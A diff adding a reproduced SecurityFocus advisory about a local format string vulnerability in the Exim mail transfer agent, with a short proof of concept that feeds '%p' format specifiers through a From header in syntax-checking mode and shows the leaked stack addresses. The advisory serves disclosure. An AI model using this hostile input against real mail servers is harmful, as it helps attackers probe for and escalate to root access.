@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/2828/info
+
+Exim is a free, open-source Mail Transfer Agent for Unix systems.
+
+Exim is vulnerable to a locally exploitable format string attack which may compromise root access. The vulnerability exists only when the 'syntax checking' mode is turned on, which it is not by default.
+
+The vulnerability has to do with handling of the hostname string in an email address argumenting the 'From:' field. If the syntax checking is enabled, then this vulnerability can be exploited to execute arbitrary code with root priviliges. 
+
+Try this:
+===8<======8<=======8<======
+lez:~$ /usr/sbin/exim -bS
+mail from:lez@lez
+rcpt to:hax0r@lez
+data
+From:@@%p%p%p%p%p%p%p%p%p%p
+
+.
+===8<======8<=======8<=======
+
+Somewhere in the answers you should see:
+550 Syntax error in 'From' header: domain missing or malformed: failing address is:
+@@0x80beba00x804d2690x80be6600x80be6680x80bd050(nil)(nil)(nil)(nil)0x80b9d40 
